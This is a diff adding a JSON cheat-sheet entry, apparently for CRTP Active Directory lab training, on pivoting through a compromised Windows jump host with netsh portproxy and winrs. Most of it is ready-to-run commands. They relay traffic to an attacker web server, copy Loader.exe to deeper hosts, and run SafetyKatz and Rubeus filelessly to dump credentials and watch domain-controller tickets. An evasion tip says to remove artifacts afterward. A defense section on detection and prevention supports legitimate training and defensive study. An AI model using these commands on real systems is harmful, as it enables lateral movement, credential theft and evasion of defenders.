@@ -1,0 +1,115 @@
+{
+  "id": "crtp-portproxy-pivot",
+  "name": "Pivoting with netsh portproxy + winrs",
+  "command": "netsh interface portproxy add v4tov4 listenport=<listen_port> listenaddress=0.0.0.0 connectport=<dst_port> connectaddress=<attacker_ip>",
+  "description": "Reach hosts that can't talk to your attack box directly by turning a compromised jump host into a relay. netsh portproxy forwards a local port on the jump host to your web server, so tools like Loader.exe on the deep host can fetch payloads from http://127.0.0.1:<port>/. Commands are driven remotely over winrs.",
+  "platform": "windows",
+  "category": "Active Directory",
+  "subcategory": "Lateral Movement",
+  "type": "command",
+  "certifications": [
+    "CRTP"
+  ],
+  "source": "CRTP",
+  "opsec": "moderate",
+  "mitre": [
+    "T1090.001",
+    "T1021.006"
+  ],
+  "tools": [
+    "netsh",
+    "winrs",
+    "Loader.exe"
+  ],
+  "tags": [
+    "pivoting",
+    "portproxy",
+    "winrs",
+    "port-forwarding",
+    "relay",
+    "crtp"
+  ],
+  "variations": [
+    {
+      "label": "Add a portproxy on the jump host (remote via winrs)",
+      "command": "winrs -r:<jump_host> netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=<attacker_ip>"
+    },
+    {
+      "label": "Fetch + run a tool through the proxy on the deep host",
+      "command": "winrs -r:<deep_host> C:\\Users\\Public\\Loader.exe -path http://127.0.0.1:8080/<tool>.exe \"<args>\" \"exit\""
+    },
+    {
+      "label": "Stage the loader to the deep host first",
+      "command": "echo F | xcopy C:\\AD\\Tools\\Loader.exe \\\\<deep_host>\\C$\\Users\\Public\\Loader.exe /Y"
+    }
+  ],
+  "steps": [
+    {
+      "label": "Copy Loader to the jump/deep host",
+      "command": "echo F | xcopy C:\\Users\\Public\\Loader.exe \\\\dcorp-mgmt\\C$\\Users\\Public\\Loader.exe"
+    },
+    {
+      "label": "On the jump host, forward 8080 -> your web server:80",
+      "command": "$null | winrs -r:dcorp-mgmt \"netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=172.16.100.x\""
+    },
+    {
+      "label": "Run SafetyKatz via the proxy (fileless)",
+      "command": "$null | winrs -r:dcorp-mgmt \"cmd /c C:\\Users\\Public\\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe sekurlsa::evasive-keys exit\""
+    }
+  ],
+  "examples": [
+    {
+      "label": "Reach the DC through dcorp-mgmt",
+      "command": "winrs -r:dcorp-dc cmd /c \"netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=172.16.100.x\""
+    },
+    {
+      "label": "Loader monitor through the proxy",
+      "command": "C:\\Users\\Public\\Loader.exe -path http://127.0.0.1:8080/Rubeus.exe -args monitor /targetuser:DCORP-DC$ /interval:5 /nowrap"
+    }
+  ],
+  "notes": "Used throughout CRTP when a deep host (dcorp-mgmt, dcorp-dc) can't reach the student web server directly - the compromised intermediary becomes the relay. Pair with winrs for remote command execution and Loader.exe for fileless assembly loading over 127.0.0.1. Remove the portproxy afterward: netsh interface portproxy delete v4tov4 listenport=8080 listenaddress=0.0.0.0.",
+  "references": [
+    {
+      "title": "CRTP - Attacking and Defending AD (lab)",
+      "url": "https://www.alteredsecurity.com/adlab"
+    },
+    {
+      "title": "MITRE ATT&CK T1090.001 - Internal Proxy",
+      "url": "https://attack.mitre.org/techniques/T1090/001/"
+    }
+  ],
+  "recommended": [
+    {
+      "id": "crtp-psremoting",
+      "note": "winrs/PSRemoting is how you drive the jump host",
+      "rel": "prereq"
+    },
+    {
+      "id": "crtp-loader",
+      "note": "Loader fetches assemblies through the 127.0.0.1 proxy",
+      "rel": "next"
+    },
+    {
+      "id": "crtp-credential-dumping",
+      "note": "Run SafetyKatz on the deep host via the proxy",
+      "rel": "next"
+    }
+  ],
+  "defense": {
+    "prerequisites": "Admin/remoting rights on the jump host (to run netsh and winrs). WinRM (5985) reachable to the jump host; the jump host can reach both you and the deep target.",
+    "why_it_works": "netsh interface portproxy is a built-in Windows userland TCP forwarder; combined with WinRM remote execution it lets a compromised host relay arbitrary traffic between network segments that are otherwise isolated - no third-party tooling needed (living off the land).",
+    "misconfiguration": "WinRM broadly enabled; local admins able to create portproxy rules; flat networks / no segmentation between tiers; egress from servers to attacker infrastructure permitted.",
+    "impact": "Bridges network segmentation - lets the attacker reach and execute on isolated DCs/servers and pull fileless payloads into them, extending compromise deep into the environment.",
+    "detection": "Creation of portproxy rules (netsh interface portproxy add) - Sysmon 1 / 4688 command line; the iphlpsvc portproxy registry key (HKLM\\...\\PortProxy\\v4tov4). WinRM (5985) sessions issuing netsh/loader commands; unexpected listening ports on servers; loopback HTTP fetches of .exe.",
+    "artifacts": "PortProxy registry entries; netsh command lines in process logs; WSMan/WinRM operational logs; new listeners (netstat) on the jump host.",
+    "vulnerable_config": "# WinRM enabled on servers; local admins can run netsh\n# Flat network, servers can reach the internet/attacker\n# No alerting on portproxy creation",
+    "secure_config": "# Restrict WinRM to management subnets/jump servers (IPSec/firewall)\n# Network segmentation + host firewall deny east-west\n# Alert on 'netsh interface portproxy add' and PortProxy registry writes\n# Egress filtering from server tiers",
+    "prevention": "Segment the network and restrict WinRM to PAWs; block server egress to untrusted hosts; alert on portproxy rule creation and WinRM-driven netsh. [MITRE M1030, M1037, M1042]",
+    "evasion": "Uses only built-in tools (netsh/winrs) so blends with admin activity; tear down the portproxy rule after use to remove the artifact.",
+    "sources": [
+      "CRTP",
+      "MITRE T1090.001",
+      "MITRE T1021.006"
+    ]
+  }
+}
